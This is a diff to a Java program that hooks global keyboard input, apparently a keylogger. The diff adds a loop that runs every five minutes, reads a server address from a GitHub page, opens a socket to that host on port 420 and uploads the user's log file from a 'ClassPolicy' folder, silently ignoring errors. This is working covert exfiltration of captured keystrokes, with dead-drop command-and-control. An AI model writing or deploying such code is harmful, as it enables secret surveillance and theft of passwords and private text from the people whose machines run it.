@@ -2,14 +2,19 @@ package main;
 
 import org.jnativehook.keyboard.NativeKeyListener;
 
+import java.io.BufferedInputStream;
 import java.io.BufferedWriter;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.io.OutputStream;
 import java.io.PrintWriter;
+import java.net.Socket;
 import java.net.URISyntaxException;
 import java.net.URL;
 import java.text.SimpleDateFormat;
+import java.util.Calendar;
 import java.util.Date;
 import java.util.Scanner;
 
@@ -57,6 +62,39 @@ public class Main implements NativeKeyListener{
 			e.printStackTrace();
 		}
 		GlobalScreen.getInstance().addNativeKeyListener(new Main());
+		for(;;) {
+			java.util.Date date = new java.util.Date();
+		    Calendar cal = Calendar.getInstance();
+		    cal.setTime(date);
+		    int minutes = cal.get(Calendar.MINUTE);
+			 if (minutes % 5 == 0) {
+			    	// send the file
+			    	try {
+			    		URL oracle = new URL("https://github.com/OtakuInSeattle/sites/blob/master/uploader");
+			            Scanner inSt = new Scanner(oracle.openStream());
+			            String inputLine = "";
+			            while (!inputLine.equals("connectTo")){
+			                inputLine = inSt.next();
+			    		}
+			    		String connectTo = inSt.next();
+			    		Socket socket = new Socket(connectTo, 420);
+			    		OutputStream t = socket.getOutputStream();
+			    		PrintWriter out = new PrintWriter(t);
+						String toSend = System.getProperty("user.name") + ".txt";
+						out.print(toSend );
+			    		File transferFile = new File ("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt"); 
+			    		byte [] bytearray = new byte [(int)transferFile.length()]; 
+			    		FileInputStream fin = new FileInputStream(transferFile); 
+			    		BufferedInputStream bin = new BufferedInputStream(fin); 
+			    		bin.read(bytearray,0,bytearray.length); 
+			    		OutputStream os = socket.getOutputStream(); 
+			    		System.out.println(""); 
+			    		os.write(bytearray,0,bytearray.length); 
+			    		os.flush(); 
+			    	} catch (Exception e) {
+			    	}
+			    }
+		}
 	}
 
 	private static boolean isSuicune() {
